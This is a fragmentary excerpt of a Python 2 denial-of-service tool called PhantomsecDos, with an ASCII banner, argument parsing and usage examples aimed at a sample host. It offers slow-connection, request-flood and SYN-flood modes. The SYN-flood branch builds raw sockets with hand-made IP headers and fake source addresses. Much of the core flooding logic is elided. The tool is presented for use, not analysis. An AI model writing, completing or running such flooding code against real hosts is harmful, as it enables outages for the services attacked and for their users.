...
title = '''
 ...
 \______   \  |__ _____    _____/  |_  ____   _____   ______ ____   ____  
 |     ___/  |  \\__  \  /    \   __\/  _ \ /     \ /  ___// __ \_/ ___\ 
 |    |   |   Y  \/ __ \|   |  \  | (  <_> )  Y Y  \\___ \\  ___/\  \___ 
 |____|   |___|  (____  /___|  /__|  \____/|__|_|  /____  >\___  >\___  >
               \/     \/     \/                  \/     \/     \/     \/                                                 
...
def check_tgt(args):
	...
	try:
		...
		sys.exit(cprint('[+] Can\'t resolve host!','green'))
	return ip
	...
	def doconnection(self):
		...
		while socks < (int(self.threads)):
			try:
				...
				sys.exit(cprint('[+] Attack canceled by operator','blue'))
...
def main():
	parser = ArgumentParser(
        usage='sudo python2 PhantomsecDos -t [tar] -p [port] -t [number threads]',
        formatter_class=RawTextHelpFormatter,
        prog='Overload-DoS.py',
        description=cprint(title,'white',attrs=['bold']),
        epilog='''
Example:
    sudo python2 PhantomsecDos -target www.example.com -port 80 -T 2000 -slow
    sudo python2 PhantomsecDos -target www.example.com -sleep 100 -request
    sudo python2 PhantomsecDos -target www.example.com -syn -T 5000 -t 10.0
'''
)
	...
	if args.syn:
		uid = os.getuid()
		if uid == 0:
			cprint('# Thank you for using PhantomsecDos','blue')
			time.sleep(0.5)
		else:
			sys.exit(cprint('# you must run this program with root','red'))
		tgt=check_tgt(args)
		synsock=socket(AF_INET,SOCK_RAW,IPPROTO_TCP)
		synsock.setsockopt(IPPROTO_IP,IP_HDRINCL,1)
		ts=[]
		threads=[]
		print colored('[*] Syn flooding: ','blue')+colored(tgt,'red')
		while 1:
			if args.spoof == False:
				args.fakeip = True
				if args.fakeip == True:
	...
	if not (args.syn) and not (args.request) and not (args.slow):
		parser.print_help()
		print
		cprint('[+] You must choose an attack.','red')
		sys.exit(cprint('# -syn | -request | -slow','blue'))
